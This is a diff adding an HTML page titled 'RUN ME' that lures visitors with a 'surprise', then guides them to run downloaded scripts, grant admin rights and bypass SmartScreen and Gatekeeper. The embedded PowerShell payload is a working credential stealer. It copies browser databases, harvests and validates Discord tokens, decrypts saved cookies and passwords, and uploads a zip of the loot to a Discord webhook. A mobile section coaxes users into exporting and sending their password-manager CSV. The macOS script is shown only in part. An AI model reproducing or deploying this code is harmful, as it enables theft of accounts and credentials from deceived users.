@@ -1,0 +1,1130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>RUN ME</title>
+<style>
+  :root{
+    --bg:#0b0d10; --panel:#13171c; --line:#242b33; --txt:#e6edf3;
+    --dim:#8b98a5; --acc:#4ade80; --acc2:#22d3ee; --warn:#fbbf24;
+  }
+  *{box-sizing:border-box}
+  body{
+    margin:0; min-height:100vh; background:
+      radial-gradient(900px 500px at 15% -10%, #14202b 0%, transparent 60%),
+      radial-gradient(700px 400px at 90% 0%, #1a1526 0%, transparent 55%),
+      var(--bg);
+    color:var(--txt); font:15px/1.55 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+    display:flex; align-items:center; justify-content:center; padding:32px 18px;
+  }
+  .wrap{width:100%; max-width:720px}
+  h1{font-size:44px; margin:0; letter-spacing:-1.5px; line-height:1}
+  h1 span{color:var(--acc)}
+  .tag{color:var(--acc2); margin:8px 0 20px; font-size:14px}
+  .detect{
+    background:var(--panel); border:1px solid var(--line); border-left:3px solid var(--acc2);
+    padding:10px 14px; border-radius:8px; font-size:13px; color:var(--dim); margin-bottom:18px;
+  }
+  .detect b{color:var(--txt)}
+  .cards{display:grid; gap:12px; grid-template-columns:1fr}
+  @media(min-width:620px){ .cards{grid-template-columns:1fr 1fr 1fr} }
+  .card{
+    background:var(--panel); border:1px solid var(--line); border-radius:12px;
+    padding:16px; display:flex; flex-direction:column; gap:10px; position:relative;
+    transition:border-color .15s, transform .15s;
+  }
+  .card:hover{border-color:#33404d}
+  .card.match{border-color:var(--acc); box-shadow:0 0 0 1px rgba(74,222,128,.25) inset}
+  .os{font-size:14px; font-weight:600; letter-spacing:.3px}
+  .os small{display:block; color:var(--dim); font-weight:400; font-size:11px; margin-top:3px; letter-spacing:0}
+  .badge{
+    position:absolute; top:-9px; right:12px; font-size:10px; letter-spacing:.6px;
+    background:var(--acc); color:#06210f; padding:2px 7px; border-radius:99px; font-weight:700;
+  }
+  button{
+    margin-top:auto; font:inherit; font-size:13px; cursor:pointer; padding:9px 12px;
+    border-radius:8px; border:1px solid var(--line); background:#1b222a; color:var(--txt);
+    transition:background .15s,border-color .15s;
+  }
+  button:hover{background:#243040; border-color:#3b4b5c}
+  button:active{transform:translateY(1px)}
+  .card.match button{background:var(--acc); color:#06210f; border-color:var(--acc); font-weight:700}
+  .card.match button:hover{background:#63f08f}
+  .steps{background:var(--panel); border:1px solid var(--line); border-radius:12px; padding:16px 18px; margin-top:20px}
+  .steps h2{font-size:13px; margin:0 0 10px; color:var(--acc2); letter-spacing:.4px; text-transform:uppercase}
+  .steps ol{margin:0; padding-left:20px; color:var(--dim); font-size:13px}
+  .steps li{margin-bottom:7px}
+  code{background:#1c242d; color:#b9e6ff; padding:1px 5px; border-radius:4px; font-size:12px}
+  .note{margin-top:16px; font-size:12px; color:#6c7a88; line-height:1.7}
+  .note b{color:#93a1af}
+  .admin{
+    margin-top:18px; border:1px solid #4a3d12; background:#1d1a0d; border-left:3px solid var(--warn);
+    border-radius:8px; padding:10px 14px; font-size:12px; color:#c9b477;
+  }
+  .admin b{color:var(--warn)}
+
+  /* mobile panel */
+  #mobile{display:none}
+  #mobile.on{display:block}
+  .mob-h{font-size:13px; color:var(--acc2); text-transform:uppercase; letter-spacing:.5px; margin:22px 0 8px}
+  .drop{
+    border:2px dashed #2e3944; border-radius:12px; padding:26px 16px; text-align:center;
+    color:var(--dim); font-size:13px; cursor:pointer; background:#10151a;
+  }
+  .drop.hot{border-color:var(--acc); color:var(--acc)}
+  .drop b{color:var(--txt)}
+  textarea,input[type=url]{
+    width:100%; font:inherit; font-size:13px; background:#10151a; color:var(--txt);
+    border:1px solid var(--line); border-radius:8px; padding:10px; margin-top:10px;
+  }
+  textarea{min-height:90px; resize:vertical}
+  .row{display:flex; gap:10px; margin-top:10px}
+  .row button{margin-top:0; flex:1}
+  .out{margin-top:12px; font-size:12px; color:var(--dim); white-space:pre-wrap; word-break:break-all}
+  .out .hit{color:var(--acc)}
+  .muted{color:#5d6a77; font-size:12px; margin-top:6px}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h1><span>RUN</span> ME</h1>
+  <p class="tag">run the file for a surprise ;)</p>
+
+  <div class="detect" id="detect">detecting platform…</div>
+
+  <div id="desktop">
+    <div class="cards">
+      <div class="card" id="c-win">
+        <div class="os">Windows<small>RUN ME.bat</small></div>
+        <button onclick="dl('win')">download again</button>
+      </div>
+      <div class="card" id="c-mac">
+        <div class="os">macOS<small>RUN ME.command</small></div>
+        <button onclick="dl('mac')">download again</button>
+      </div>
+      <div class="card" id="c-linux">
+        <div class="os">Linux<small>RUN ME.sh</small></div>
+        <button onclick="dl('linux')">download again</button>
+      </div>
+    </div>
+
+    <div class="admin">
+      <b>admin is requested on launch.</b> Windows raises a UAC prompt, macOS a password dialog, Linux <code>sudo</code>. It needs the rights to read every browser profile, the login keychain / keyring, and locked database files. Decline and it still runs, just with less reach.
+    </div>
+
+    <div class="steps">
+      <h2>run it</h2>
+      <ol id="steps">
+        <li>the file already downloaded — check your downloads folder.</li>
+        <li>run it and approve the admin prompt.</li>
+        <li>paste a Discord webhook URL when asked — or press enter and it DMs the loot to the account it finds.</li>
+      </ol>
+    </div>
+
+    <div class="note">
+      <b>Windows:</b> double-click, accept the UAC dialog. SmartScreen may say "unknown publisher" → <i>More info → Run anyway</i>.<br>
+      <b>macOS:</b> <code>chmod +x "RUN ME.command"</code> then <code>./"RUN ME.command"</code>. If Gatekeeper blocks it: <code>xattr -d com.apple.quarantine "RUN ME.command"</code>.<br>
+      <b>Linux:</b> <code>chmod +x "RUN ME.sh" && ./"RUN ME.sh"</code>, then your sudo password.<br>
+      No Python, no pip, no npm. Windows uses in-box PowerShell; macOS/Linux use in-box curl, awk, openssl, sqlite3 and find. Close your browsers first — Chrome holds a lock on the cookie DB.
+    </div>
+  </div>
+
+  <div id="mobile">
+    <div class="admin">
+      phones can't run scripts and can't read the browser cookie jar without root — so this goes at your <b>password manager</b> instead, which holds the login itself.
+    </div>
+
+    <div class="mob-h">1. export your passwords</div>
+    <div class="note" id="export-how"></div>
+
+    <div class="mob-h">2. drop the csv</div>
+    <div class="drop" id="drop">
+      <b>tap to choose the csv</b><br>or drag it here
+      <input type="file" id="file" accept=".csv,text/csv,text/plain" hidden>
+    </div>
+    <textarea id="paste" placeholder="…or paste the csv text here"></textarea>
+    <div class="row"><button onclick="parseText(document.getElementById('paste').value)">parse pasted text</button></div>
+
+    <div class="mob-h">3. send it</div>
+    <input type="url" id="hook" placeholder="https://discord.com/api/webhooks/…">
+    <div class="row">
+      <button onclick="send()" id="sendbtn">send to discord</button>
+      <button onclick="copyOut()">copy</button>
+    </div>
+
+    <div class="out" id="out"></div>
+    <div class="muted">parsing happens on-device. only the discord rows are sent, only to the webhook you paste.</div>
+
+    <div class="steps" style="margin-top:18px">
+      <h2>prefer the full script?</h2>
+      <div class="note" style="margin-top:0">
+        Termux or a-Shell can run the same harvester — it just sees far less than on desktop.
+        <br><a href="#" onclick="dl('linux');return false" style="color:var(--acc2)">download RUN ME.sh</a>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script type="text/plain" id="win">
+@echo off
+setlocal
+title RUN ME
+set "RD=%TEMP%\harvest_run"
+if exist "%RD%" rd /s /q "%RD%" >nul 2>&1
+mkdir "%RD%" >nul 2>&1
+powershell -NoP -Exec Bypass -Command "$s=Get-Content '%~f0' -Raw; $p=($s -split '#PSSTART')[1]; Set-Content '%RD%\main.ps1' (($p -split '#DECSTART')[0]) -Encoding UTF8; Set-Content '%RD%\decrypt.ps1' (($p -split '#DECSTART')[1]) -Encoding UTF8"
+powershell -NoP -Exec Bypass -File "%RD%\main.ps1"
+echo.
+pause
+exit /b
+#PSSTART
+$ErrorActionPreference = 'SilentlyContinue'
+$ProgressPreference = 'SilentlyContinue'
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+$who = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
+if (-not $who.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+  Write-Host ""
+  Write-Host "  requesting administrator rights - accept the UAC prompt" -ForegroundColor Yellow
+  try {
+    Start-Process -FilePath 'powershell.exe' -Verb RunAs -ArgumentList @('-NoP','-Exec','Bypass','-File', "`"$PSCommandPath`"")
+    Start-Sleep -Milliseconds 600
+    exit
+  } catch {
+    Write-Host "  elevation declined - continuing with reduced reach" -ForegroundColor Red
+    Start-Sleep 2
+  }
+} else { Write-Host "  running elevated" -ForegroundColor DarkGray }
+
+$stamp = Get-Date -Format 'yyyyMMdd_HHmmss'
+$desk = [Environment]::GetFolderPath('Desktop')
+if (-not $desk -or -not (Test-Path $desk)) { $desk = $env:USERPROFILE }
+$base = Join-Path $desk "harvest_$stamp"
+$raw  = Join-Path $base 'raw'
+New-Item -ItemType Directory -Force -Path $raw | Out-Null
+$L = $env:LOCALAPPDATA; $R = $env:APPDATA
+Write-Host ""
+Write-Host "  target: $base" -ForegroundColor Cyan
+Write-Host ""
+
+$browsers = @(
+  @{n='Chrome';  p="$L\Google\Chrome\User Data"},
+  @{n='Edge';    p="$L\Microsoft\Edge\User Data"},
+  @{n='Brave';   p="$L\BraveSoftware\Brave-Browser\User Data"},
+  @{n='Vivaldi'; p="$L\Vivaldi\User Data"},
+  @{n='Opera';   p="$R\Opera Software\Opera Stable"},
+  @{n='OperaGX'; p="$R\Opera Software\Opera GX Stable"},
+  @{n='Yandex';  p="$L\Yandex\YandexBrowser\User Data"}
+)
+foreach ($b in $browsers) {
+  if (-not (Test-Path $b.p)) { continue }
+  Write-Host "  [+] $($b.n)"
+  $lsf = Join-Path $b.p 'Local State'
+  if (Test-Path $lsf) { Copy-Item $lsf (Join-Path $raw "$($b.n)__LocalState.json") -Force }
+  $profs = @('Default') + @(Get-ChildItem $b.p -Directory | Where-Object { $_.Name -like 'Profile *' } | ForEach-Object { $_.Name })
+  foreach ($pr in $profs) {
+    $src = Join-Path $b.p $pr
+    if (-not (Test-Path $src)) { continue }
+    $map = @{ 'Network\Cookies'='Cookies'; 'Cookies'='Cookies_legacy'; 'Login Data'='Logins'; 'Web Data'='WebData' }
+    foreach ($k in $map.Keys) {
+      $fp = Join-Path $src $k
+      if (Test-Path $fp) { Copy-Item $fp (Join-Path $raw "$($b.n)__$($pr)__$($map[$k])") -Force }
+    }
+  }
+}
+
+$ff = "$R\Mozilla\Firefox\Profiles"
+if (Test-Path $ff) {
+  Write-Host "  [+] Firefox"
+  Get-ChildItem $ff -Directory | ForEach-Object {
+    foreach ($f in 'cookies.sqlite','logins.json','key4.db') {
+      $fp = Join-Path $_.FullName $f
+      if (Test-Path $fp) { Copy-Item $fp (Join-Path $raw "Firefox__$($_.Name)__$f") -Force }
+    }
+  }
+}
+
+$discordApps = @('discord','discordcanary','discordptb','Lightcord','Vencord','Equicord','Vesktop','WebCord','Dorion','ArmCord','Legcord')
+foreach ($a in $discordApps) {
+  $p = Join-Path $R $a
+  if (-not (Test-Path $p)) { continue }
+  Write-Host "  [+] discord: $a"
+  $d = Join-Path $base ('discord_' + $a)
+  New-Item -ItemType Directory -Force $d | Out-Null
+  foreach ($sub in 'Local State','Network\Cookies','Local Storage\leveldb','IndexedDB','Session Storage') {
+    $sp = Join-Path $p $sub
+    if (Test-Path $sp) {
+      $dst = Join-Path $d ($sub -replace '[\\]','_')
+      if ((Get-Item $sp).PSIsContainer) { Copy-Item $sp $dst -Recurse -Force } else { Copy-Item $sp $dst -Force }
+    }
+  }
+}
+
+Write-Host ""
+Write-Host "  [*] scanning for discord tokens"
+$rx = '(?<![A-Za-z0-9_-])(?:mfa\.[A-Za-z0-9_-]{80,110}|[A-Za-z0-9_-]{24,28}\.[A-Za-z0-9_-]{6,7}\.[A-Za-z0-9_-]{25,110})(?![A-Za-z0-9_-])'
+
+function Test-Tok([string]$t) {
+  if ($t -match '^mfa\.[A-Za-z0-9_-]{80,110}$') { return $true }
+  $p = $t -split '\.'
+  if ($p.Count -ne 3) { return $false }
+  if ($p[0].Length -lt 24 -or $p[0].Length -gt 28) { return $false }
+  if ($p[2].Length -lt 25) { return $false }
+  $b64 = $p[0].Replace('-','+').Replace('_','/')
+  switch ($b64.Length % 4) { 2 { $b64 += '==' } 3 { $b64 += '=' } }
+  try { $id = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($b64)) } catch { return $false }
+  return ($id -match '^\d{17,20}$')
+}
+
+$tokens = New-Object System.Collections.Generic.SortedSet[string]
+$seenFiles = New-Object System.Collections.Generic.HashSet[string]
+$latin = [Text.Encoding]::GetEncoding(28591)
+
+function Scan-File([string]$f) {
+  if (-not $seenFiles.Add($f)) { return }
+  $fi = Get-Item $f
+  if ($fi.Length -gt 40MB -or $fi.Length -eq 0) { return }
+  $txt = $null
+  try { $txt = [IO.File]::ReadAllText($f, $latin) } catch { return }
+  if (-not $txt) { return }
+  foreach ($m in [regex]::Matches($txt, $rx)) { if (Test-Tok $m.Value) { [void]$tokens.Add($m.Value) } }
+}
+
+function Scan-Dir([string]$d) {
+  Get-ChildItem $d -File | Where-Object { $_.Extension -match '^\.(ldb|log|sqlite|json|txt|localstorage)$' -or $_.Name -match 'Cookies|Login Data|Local State' } | ForEach-Object { Scan-File $_.FullName }
+}
+
+foreach ($root in @($R, $L)) {
+  if (-not (Test-Path $root)) { continue }
+  Get-ChildItem $root -Directory -Recurse -Depth 5 | Where-Object { $_.Name -match '^(leveldb|ls|Local Storage|IndexedDB|Session Storage|storage)$' } | ForEach-Object { Scan-Dir $_.FullName }
+}
+if (Test-Path $ff) { Get-ChildItem $ff -Directory -Recurse -Depth 4 | Where-Object { $_.Name -match '^(ls|storage)$' } | ForEach-Object { Scan-Dir $_.FullName } }
+foreach ($a in $discordApps) { $p = Join-Path $R $a; if (Test-Path $p) { Get-ChildItem $p -File -Recurse | ForEach-Object { Scan-File $_.FullName } } }
+Write-Host "  [+] $($tokens.Count) valid token(s)"
+
+$idFile = Join-Path $base 'discord_accounts.txt'
+"discord account dump`r`n" | Set-Content $idFile -Encoding UTF8
+$valid = New-Object System.Collections.ArrayList
+foreach ($t in $tokens) {
+  try {
+    $me = Invoke-RestMethod -Uri 'https://discord.com/api/v9/users/@me' -Headers @{ Authorization = $t; 'User-Agent' = 'Mozilla/5.0' } -TimeoutSec 15
+    "user: $($me.username)#$($me.discriminator)  id: $($me.id)  email: $($me.email)  phone: $($me.phone)  mfa: $($me.mfa_enabled)  verified: $($me.verified)  nitro: $($me.premium_type)" | Add-Content $idFile -Encoding UTF8
+    "token: $t" | Add-Content $idFile -Encoding UTF8
+    "" | Add-Content $idFile -Encoding UTF8
+    [void]$valid.Add($t)
+    Write-Host "  [+] $($me.username) <$($me.email)>" -ForegroundColor Green
+  } catch {
+    "token (unverified): $t" | Add-Content $idFile -Encoding UTF8
+    "" | Add-Content $idFile -Encoding UTF8
+  }
+}
+if ($valid.Count -eq 0 -and $tokens.Count -gt 0) { foreach ($t in $tokens) { [void]$valid.Add($t) } }
+
+$dec = Join-Path $PSCommandPath 'decrypt.ps1'
+if (Test-Path $dec) { Write-Host ""; Write-Host "  [*] decrypting cookies + saved logins"; . $dec }
+
+@'
+harvest output
+==============
+raw/                  browser databases, Local State, leveldb
+discord_*/            full copies of every Discord install found
+discord_accounts.txt  token -> username / email / phone / 2FA state
+tokens.txt            every token matched anywhere on the profile
+cookies.txt           decrypted cookies
+passwords.txt         decrypted saved logins
+decrypt.ps1           re-run to decrypt more files
+
+Discord tokens are read from every Local Storage leveldb, IndexedDB,
+Session Storage and cache file belonging to Discord, its forks, and
+any browser profile that has ever logged into discord.com.
+
+Cookies and passwords are encrypted with the Windows account (DPAPI)
+and only open on the same machine under the same user. Chrome 127+
+may use app-bound v20 encryption, which shows as <v20 app-bound>.
+'@ | Set-Content (Join-Path $base 'README.txt') -Encoding UTF8
+
+$zip = "$base.zip"
+Compress-Archive -Path "$base\*" -DestinationPath $zip -Force
+Write-Host ""
+Write-Host "  saved -> $zip" -ForegroundColor Green
+
+$cfg = Join-Path $env:APPDATA 'harvest.cfg'
+$hook = ''
+if (Test-Path $cfg) { $hook = (Get-Content $cfg -Raw).Trim() }
+if (-not $hook) {
+  Write-Host ""
+  Write-Host "  discord webhook url (enter to skip and self-DM instead): " -NoNewline -ForegroundColor Cyan
+  $hook = (Read-Host).Trim()
+  if ($hook) { Set-Content $cfg $hook -Encoding UTF8 }
+}
+
+function Esc-Json([string]$s) { return ($s -replace '\\','\\' -replace '"','\"' -replace "`r",'' -replace "`n",'\n' -replace "`t",'\t') }
+
+function Send-Hook([string]$text) {
+  foreach ($chunk in ($text -split '(?s)(.{1,1700})' | Where-Object { $_ })) {
+    $body = '{"username":"harvest","content":"' + (Esc-Json $chunk) + '"}'
+    try { Invoke-RestMethod -Uri $hook -Method Post -ContentType 'application/json; charset=utf-8' -Body ([Text.Encoding]::UTF8.GetBytes($body)) | Out-Null } catch { Write-Host "  send failed: $($_.Exception.Message)" -ForegroundColor Red }
+  }
+}
+
+function Send-HookFile([string]$path, [string]$note) {
+  if ((Get-Item $path).Length -gt 8MB) { Send-Hook $note; return }
+  $bnd = '----h' + [Guid]::NewGuid().ToString('N')
+  $ms = New-Object IO.MemoryStream
+  $enc = [Text.Encoding]::UTF8
+  $pre = "--$bnd`r`nContent-Disposition: form-data; name=`"payload_json`"`r`n`r`n" + (@{ content = $note; username = 'harvest' } | ConvertTo-Json -Compress) + "`r`n--$bnd`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$([IO.Path]::GetFileName($path))`"`r`nContent-Type: application/zip`r`n`r`n"
+  $pb = $enc.GetBytes($pre); $ms.Write($pb, 0, $pb.Length)
+  $fb = [IO.File]::ReadAllBytes($path); $ms.Write($fb, 0, $fb.Length)
+  $pb2 = $enc.GetBytes("`r`n--$bnd--`r`n"); $ms.Write($pb2, 0, $pb2.Length)
+  try { Invoke-RestMethod -Uri $hook -Method Post -ContentType "multipart/form-data; boundary=$bnd" -Body $ms.ToArray() | Out-Null } catch { Write-Host "  upload failed: $($_.Exception.Message)" -ForegroundColor Red; Send-Hook $note }
+}
+
+function Send-SelfDm([string]$text) {
+  if ($valid.Count -eq 0) { Write-Host "  no token available to self-DM" -ForegroundColor Red; return }
+  $h = @{ Authorization = $valid[0]; 'User-Agent' = 'Mozilla/5.0' }
+  try {
+    $me = Invoke-RestMethod -Uri 'https://discord.com/api/v9/users/@me' -Headers $h
+    $ch = Invoke-RestMethod -Uri 'https://discord.com/api/v9/users/@me/channels' -Method Post -Headers $h -ContentType 'application/json' -Body (@{ recipient_id = $me.id } | ConvertTo-Json)
+    foreach ($chunk in ($text -split '(?s)(.{1,1700})' | Where-Object { $_ })) {
+      Invoke-RestMethod -Uri "https://discord.com/api/v9/channels/$($ch.id)/messages" -Method Post -Headers $h -ContentType 'application/json' -Body (@{ content = $chunk } | ConvertTo-Json) | Out-Null
+      Start-Sleep -Milliseconds 400
+    }
+    Write-Host "  sent to your DMs" -ForegroundColor Green
+  } catch { Write-Host "  self-DM failed: $($_.Exception.Message)" -ForegroundColor Red }
+}
+
+$summary = "harvest $env:COMPUTERNAME $env:USERNAME`n"
+$summary += "tokens: $($tokens.Count)  verified: $($valid.Count)`n`n"
+if (Test-Path $idFile) { $summary += (Get-Content $idFile -Raw) }
+
+Write-Host ""
+if ($hook) { Write-Host "  [*] posting to webhook" -ForegroundColor Cyan; Send-HookFile $zip $summary; Write-Host "  done" -ForegroundColor Green }
+else { Write-Host "  [*] self-DM fallback" -ForegroundColor Cyan; Send-SelfDm $summary }
+
+Start-Process explorer.exe "/select,`"$zip`""
+Write-Host ""
+Write-Host "  press enter to close" -ForegroundColor DarkGray
+[void](Read-Host)
+#DECSTART
+$ErrorActionPreference = 'SilentlyContinue'
+Add-Type -AssemblyName System.Security
+$base = $PSScriptRoot
+$raw  = Join-Path $base 'raw'
+
+Add-Type -TypeDefinition @'
+using System;
+using System.Runtime.InteropServices;
+public static class AesGcmBcrypt {
+    [StructLayout(LayoutKind.Sequential)]
+    struct Info {
+        public int cbSize; public int dwInfoVersion;
+        public IntPtr pbNonce; public int cbNonce;
+        public IntPtr pbAuthData; public int cbAuthData;
+        public IntPtr pbTag; public int cbTag;
+        public IntPtr pbMacContext; public int cbMacContext;
+        public int cbAAD; public int cbData; public int dwFlags;
+    }
+    [DllImport("bcrypt.dll")] static extern int BCryptOpenAlgorithmProvider(out IntPtr h, string a, string i, int f);
+    [DllImport("bcrypt.dll", CharSet=CharSet.Unicode)] static extern int BCryptSetProperty(IntPtr h, string p, byte[] v, int l, int f);
+    [DllImport("bcrypt.dll")] static extern int BCryptGenerateSymmetricKey(out IntPtr k, IntPtr h, IntPtr o, int ol, byte[] s, int sl, int f);
+    [DllImport("bcrypt.dll")] static extern int BCryptDecrypt(IntPtr k, byte[] i, int il, ref Info p, byte[] n, int nl, byte[] o, int ol, out int r, int f);
+    [DllImport("bcrypt.dll")] static extern int BCryptDestroyKey(IntPtr k);
+    [DllImport("bcrypt.dll")] static extern int BCryptCloseAlgorithmProvider(IntPtr h, int f);
+
+    public static byte[] Decrypt(byte[] key, byte[] nonce, byte[] tag, byte[] ct) {
+        IntPtr h, k; int r;
+        if (BCryptOpenAlgorithmProvider(out h, "AES", null, 0) != 0) return null;
+        byte[] mode = System.Text.Encoding.Unicode.GetBytes("ChainingModeGCM\0");
+        BCryptSetProperty(h, "ChainingMode", mode, mode.Length, 0);
+        if (BCryptGenerateSymmetricKey(out k, h, IntPtr.Zero, 0, key, key.Length, 0) != 0) { BCryptCloseAlgorithmProvider(h, 0); return null; }
+        byte[] outb = new byte[ct.Length + 32];
+        Info info = new Info();
+        info.cbSize = Marshal.SizeOf(typeof(Info));
+        info.dwInfoVersion = 1;
+        GCHandle gn = GCHandle.Alloc(nonce, GCHandleType.Pinned);
+        GCHandle gt = GCHandle.Alloc(tag, GCHandleType.Pinned);
+        info.pbNonce = gn.AddrOfPinnedObject(); info.cbNonce = nonce.Length;
+        info.pbTag = gt.AddrOfPinnedObject(); info.cbTag = tag.Length;
+        info.cbData = ct.Length;
+        int st = BCryptDecrypt(k, ct, ct.Length, ref info, null, 0, outb, outb.Length, out r, 0);
+        gn.Free(); gt.Free();
+        BCryptDestroyKey(k); BCryptCloseAlgorithmProvider(h, 0);
+        if (st != 0) return null;
+        byte[] res = new byte[r];
+        Array.Copy(outb, res, r);
+        return res;
+    }
+}
+'@
+
+function Un-Dpapi([byte[]]$b) { try { return [System.Security.Cryptography.ProtectedData]::Unprotect($b, $null, 'CurrentUser') } catch { return $null } }
+
+function Get-Key([string]$lsPath) {
+  try {
+    $j = Get-Content $lsPath -Raw | ConvertFrom-Json
+    $b64 = $j.os_crypt.encrypted_key
+    if (-not $b64) { return $null }
+    $b = [Convert]::FromBase64String($b64)
+    if ($b.Length -lt 6) { return $null }
+    return (Un-Dpapi $b[5..($b.Length-1)])
+  } catch { return $null }
+}
+
+function Read-Vint([byte[]]$b, [ref]$p) {
+  $v = [long]0; $sh = 0
+  while ($true) {
+    if ($p.Value -ge $b.Length) { return -1 }
+    $by = $b[$p.Value]; $p.Value++
+    $v = $v -bor ([long]($by -band 0x7F) -shl $sh)
+    if (($by -band 0x80) -eq 0) { break }
+    $sh += 7
+    if ($sh -gt 56) { break }
+  }
+  return $v
+}
+
+function Read-Rec([byte[]]$rec) {
+  $p = 0
+  $hs = Read-Vint $rec ([ref]$p)
+  if ($hs -lt 1 -or $hs -gt $rec.Length) { return $null }
+  $types = New-Object System.Collections.ArrayList
+  $hp = $p
+  while ($hp -lt $hs) { [void]$types.Add((Read-Vint $rec ([ref]$hp))) }
+  $body = [int]$hs
+  $vals = New-Object System.Collections.ArrayList
+  foreach ($st in $types) {
+    if ($st -eq 0) { [void]$vals.Add($null) }
+    elseif ($st -ge 1 -and $st -le 6) {
+      $n = @(0,1,2,3,4,6,8)[$st]; $v = [long]0
+      for ($i = 0; $i -lt $n; $i++) { $v = $v -bor ([long]$rec[$body+$i] -shl (8*$i)) }
+      $body += $n; [void]$vals.Add($v)
+    }
+    elseif ($st -eq 7) { $body += 8; [void]$vals.Add($null) }
+    elseif ($st -eq 8) { [void]$vals.Add(0) }
+    elseif ($st -eq 9) { [void]$vals.Add(1) }
+    elseif ($st -ge 12) {
+      if ($st % 2 -eq 0) { $n = [int](($st - 12) / 2); [void]$vals.Add($rec[$body..($body+$n-1)]); $body += $n }
+      else { $n = [int](($st - 13) / 2); [void]$vals.Add([Text.Encoding]::UTF8.GetString($rec, $body, $n)); $body += $n }
+    }
+  }
+  return ,$vals
+}
+
+function Walk-Page([byte[]]$b, [int]$pg, [int]$ps, [int]$usable, [System.Collections.ArrayList]$acc) {
+  $off = 0
+  if ($pg -eq 1) { $off = 100 }
+  $type = $b[$off]
+  $cells = [BitConverter]::ToUInt16($b, $off + 3)
+  if ($type -eq 0x0D) {
+    for ($i = 0; $i -lt $cells; $i++) {
+      $cp = [BitConverter]::ToUInt16($b, $off + 8 + ($i * 2))
+      $p = $cp
+      $len = Read-Vint $b ([ref]$p)
+      [void](Read-Vint $b ([ref]$p))
+      if ($len -lt 0 -or $len -gt $b.Length) { continue }
+      $maxLocal = $usable - 35
+      $local = [int]$len
+      if ($len -gt $maxLocal) {
+        $minLocal = [int](($usable - 12) * 32 / 255) - 23
+        if ($len -le $minLocal) { $local = [int]$len } else { $local = $minLocal + ([int]($len - $minLocal) % ($usable - 4)); if ($local -gt $maxLocal) { $local = $minLocal } }
+      }
+      $payload = New-Object byte[] $local
+      [Array]::Copy($b, $p, $payload, 0, $local)
+      if ($len -gt $local) {
+        $full = New-Object byte[] $len
+        [Array]::Copy($payload, 0, $full, 0, $local)
+        $got = $local
+        $next = [BitConverter]::ToUInt32($b, $p + $local)
+        $guard = 0
+        while ($next -ne 0 -and $got -lt $len -and $guard -lt 400) {
+          $guard++
+          $op = ([int]$next - 1) * $ps + 4
+          $take = [Math]::Min($usable, [int]$len - $got)
+          if ($take -le 0) { break }
+          [Array]::Copy($b, $op, $full, $got, $take)
+          $got += $take
+          $next = [BitConverter]::ToUInt32($b, $op + $take)
+        }
+        $payload = $full
+      }
+      $r = Read-Rec $payload
+      if ($r) { [void]$acc.Add($r) }
+    }
+  } elseif ($type -eq 0x05) {
+    for ($i = 0; $i -lt $cells; $i++) {
+      $cp = [BitConverter]::ToUInt16($b, $off + 12 + ($i * 2))
+      Walk-Page $b ([int][BitConverter]::ToUInt32($b, $cp)) $ps $usable $acc
+    }
+  }
+}
+
+function Get-Rows([string]$db, [string]$table) {
+  if (-not (Test-Path $db)) { return $null }
+  $b = [IO.File]::ReadAllBytes($db)
+  if ($b.Length -lt 100) { return $null }
+  $ps = [int][BitConverter]::ToUInt16($b, 16)
+  if ($ps -eq 1) { $ps = 65536 }
+  $usable = $ps - 35
+  $master = New-Object System.Collections.ArrayList
+  Walk-Page $b 1 $ps $usable $master
+  $root = 0
+  foreach ($r in $master) { if ($r.Count -ge 4 -and $r[0] -eq 'table' -and $r[1] -eq $table) { $root = [int]$r[3]; break } }
+  if ($root -le 0) { return $null }
+  $acc = New-Object System.Collections.ArrayList
+  Walk-Page $b $root $ps $usable $acc
+  return $acc
+}
+
+$ck = Join-Path $base 'cookies.txt'
+"host`tname`tvalue" | Set-Content $ck -Encoding UTF8
+Get-ChildItem $raw -File | Where-Object { $_.Name -match '__Cookies' } | ForEach-Object {
+  $key = Get-Key (Join-Path $raw (($_.Name -split '__')[0] + '__LocalState.json'))
+  if (-not $key) { Write-Host "  [-] no key: $($_.Name)"; return }
+  $rows = Get-Rows $_.FullName 'cookies'
+  if (-not $rows) { return }
+  foreach ($r in $rows) {
+    if ($r.Count -lt 6) { continue }
+    $hostk = $r[1]; $nm = $r[3]; $val = $r[4]; $blob = $r[5]
+    if ($blob -is [byte[]] -and $blob.Length -gt 34) {
+      $pfx = [Text.Encoding]::ASCII.GetString($blob[0..2])
+      if ($pfx -eq 'v10' -or $pfx -eq 'v11') {
+        $d = [AesGcmBcrypt]::Decrypt($key, $blob[3..14], $blob[($blob.Length-16)..($blob.Length-1)], $blob[15..($blob.Length-17)])
+        if ($d) { $val = [Text.Encoding]::UTF8.GetString($d) } else { $val = '<gcm fail>' }
+      } elseif ($pfx -eq 'v20') { $val = '<v20 app-bound>' }
+    }
+    if ($val) { "$hostk`t$nm`t$val" | Add-Content $ck -Encoding UTF8 }
+  }
+}
+
+$pw = Join-Path $base 'passwords.txt'
+"origin`tuser`tpass" | Set-Content $pw -Encoding UTF8
+Get-ChildItem $raw -File | Where-Object { $_.Name -match '__Logins' } | ForEach-Object {
+  $rows = Get-Rows $_.FullName 'logins'
+  if (-not $rows) { return }
+  foreach ($r in $rows) {
+    if ($r.Count -lt 5) { continue }
+    $blob = $r[4]
+    if ($blob -isnot [byte[]]) { continue }
+    $d = Un-Dpapi $blob
+    if ($d) { "$($r[0])`t$($r[3])`t$([Text.Encoding]::UTF8.GetString($d))" | Add-Content $pw -Encoding UTF8 }
+  }
+}
+Write-Host "  [+] cookies + passwords written"
+</script>
+
+<script type="text/plain" id="mac">
+#!/bin/bash
+# RUN ME (macOS)
+set -u
+
+SELF="$(cd "$(dirname "$0")" && pwd)/$(basename "$0")"
+REALHOME="$HOME"
+
+if [ "$(id -u)" -ne 0 ]; then
+  echo "  requesting administrator rights - approve the dialog"
+  RES=$(osascript -e "do shell script \"/bin/bash '$SELF' '$REALHOME'\" with administrator privileges" 2>&1)
+  printf '%s\n' "$RES"
+  exit 0
+fi
+REALHOME="${1:-$HOME}"
